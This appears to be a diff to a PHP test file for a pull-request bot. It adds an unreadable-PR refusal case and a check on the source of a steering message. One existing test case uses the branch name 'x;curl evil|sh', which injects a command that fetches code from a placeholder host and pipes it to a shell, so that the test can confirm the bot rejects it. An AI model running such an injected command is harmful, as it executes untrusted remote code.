@@ -34,7 +34,7 @@ function fakeSummonGitHub(array $pullRequest = [], array $reviewComments = []): 
         'api.github.com/repos/acme/web/pulls/comments/4107' => Http::response([
             'id' => 4107, 'body' => 'ImportJob is also the list item schema.', 'user' => ['login' => 'yak-bot[bot]'],
         ]),
-        'api.github.com/repos/acme/web/pulls/9' => Http::response(array_replace_recursive([
+        'api.github.com/repos/acme/web/pulls/9' => isset($pullRequest['unreadable']) ? Http::response([], 500) : Http::response(array_replace_recursive([
             'html_url' => 'https://github.com/acme/web/pull/9',
             'state' => 'open',
             'head' => ['ref' => 'feature/warnings', 'repo' => ['full_name' => 'acme/web']],
@@ -126,6 +126,7 @@ it('refuses with a reply', function (array $pullRequest, bool $registered, bool 
     'unregistered repo' => [[], false, true, 'not set up'],
     'inactive repo' => [[], true, false, 'not set up'],
     'fork' => [['head' => ['repo' => ['full_name' => 'someone/web']]], true, true, 'fork'],
+    'unreadable PR' => [['unreadable' => true], true, true, "couldn't read this pull request"],
     'closed PR' => [['state' => 'closed'], true, true, 'merged or closed'],
     'unsafe branch name' => [['head' => ['ref' => 'x;curl evil|sh']], true, true, 'branch name'],
     'trailing newline' => [['head' => ['ref' => "feature/x\n"]], true, true, 'branch name'],
@@ -146,6 +147,7 @@ it('queues behind a running task and says so', function () {
 
     expect(YakTask::count())->toBe(1)
         ->and(PendingSteeringMessage::where('root_task_id', $running->id)->count())->toBe(1)
+        ->and(PendingSteeringMessage::where('root_task_id', $running->id)->value('source'))->toBe('github_review')
         ->and(commentBodiesSent()[0])->toContain('queued');
     Queue::assertNotPushed(RunFollowUpJob::class);
 });
